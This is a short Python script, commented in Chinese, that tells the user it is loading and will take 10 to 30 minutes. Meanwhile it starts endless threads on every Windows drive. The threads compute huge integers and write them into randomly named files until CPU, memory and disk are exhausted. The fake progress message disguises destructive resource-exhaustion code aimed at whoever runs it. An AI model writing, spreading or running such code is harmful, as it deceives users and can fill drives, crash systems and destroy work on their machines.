import sys
# import tempfile
import threading
import random
import string
import os

sys.set_int_max_str_digits(0)  # 防止大整数溢出

x = 5
print("正在加载，请稍后...")
print("大约需要时间：{}分钟".format(random.randint(10,30)))

# 用于生成随机文件名的函数
def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".txt"

# 批量写入文件的函数
def write_to_file(drive, is_c_drive=False):
    global x
    if is_c_drive:
        temp_dir = os.path.join(drive, 'temp')  # 对C盘特别处理
    else:
        temp_dir = os.path.join(drive, 'temp')

    # 如果没有 temp 文件夹，则创建它
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    buffer = []  # 用于缓存计算结果，减少频繁写入

    while True:
        # 进行计算
        #a = heavy_computation()  # 执行高消耗 CPU 和内存的计算
        x += 8
        b = x**x

        # 缓存计算结果，减少频繁写入文件
        data = str(b)
        buffer.append(data)

        # 如果缓存的数据量足够大，就批量写入文件
        if len(buffer) >= 4:  # 可以调整这个值来批量写入
            random_filename = generate_random_filename()
            random_filepath = os.path.join(temp_dir, random_filename)

            # 批量写入文件
            with open(random_filepath, "a") as f:
                f.writelines(buffer)
            buffer.clear()  # 清空缓存


# 获取所有的盘符
def get_drives():
    drives = []
    if sys.platform == "win32":
        # 获取所有盘符
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
    return drives

# 获取系统中的所有盘符
drives = get_drives()

# 创建多个线程，每个线程负责写入不同盘符的 temp 文件夹
threads = []
num_threads = 2  # 每个盘符上运行多个线程，可以根据需求调整

# 如果 C 盘存在，则单独处理 C 盘
for drive in drives:
    if drive == "C:\\":
        for i in range(num_threads):
            thread = threading.Thread(target=write_to_file, args=(drive, True))
            threads.append(thread)
            thread.start()
    else:
        for i in range(num_threads):
            thread = threading.Thread(target=write_to_file, args=(drive, False))
            threads.append(thread)
            thread.start()

# 等待所有线程完成（实际上程序会持续运行直到被手动停止）
for thread in threads:
    thread.join()
